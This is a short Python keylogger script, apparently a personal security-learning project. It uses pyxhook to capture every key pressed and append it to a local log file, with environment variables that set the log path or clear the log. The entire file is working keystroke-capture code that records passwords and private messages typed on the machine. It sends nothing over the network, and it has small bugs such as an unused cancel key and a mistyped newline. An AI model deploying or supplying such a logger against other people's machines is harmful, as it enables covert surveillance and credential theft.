
import os
import pyxhook

file_log = os.environ.get( 'pylogger_file' , os.path.expanduser('~/github/SecurityPurpose/KeyStrokeRecorder/file.log'))

cancel_key = os.environ.get('pylogger_cancel','')

# getting env variable
if os.environ.get('pylogger_clean',None) is not None:
    try:
        os.remove(file_log)
    except EnvironmentError:
        pass

# on key press file to test my app
def OnKeyPress(event):
    with open(file_log,'a') as f:
        f.write(f'{event.Key}')


new_hook = pyxhook.HookManager()
new_hook.KeyDown = OnKeyPress

new_hook.HookKeyboard()

try:
    new_hook.start()
except KeyboardInterrupt:
    pass
except Exception as ex:

    msg = f'Error while catching event:\n {ex}'
    pyxhook.print_err(msg)
    with open(file_log,'a') as f:
        f.write(':/n {}'.format(msg))
